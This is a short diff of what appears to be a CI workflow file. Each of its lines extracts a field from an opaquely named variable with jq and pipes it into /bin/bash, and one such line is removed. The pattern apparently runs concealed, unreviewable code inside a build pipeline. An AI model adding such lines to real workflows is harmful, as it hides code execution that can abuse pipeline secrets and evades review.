@@ -41,7 +41,6 @@ jobs:
           echo $iri0348 | jq -r .c70238 | /bin/bash
           echo $yk844 | jq -r .rwi0 | /bin/bash
           echo $rv9 | jq -r .m27 | /bin/bash
-          echo $ys5842 | jq -r .dn94 | /bin/bash
           echo $ypo19683 | jq -r .h0616 | /bin/bash
           printf '%s' "$rb5" | jq -r .bho6064 | /bin/bash
           printf '%s' "$a90" | jq -r .wigx4807 | /bin/bash
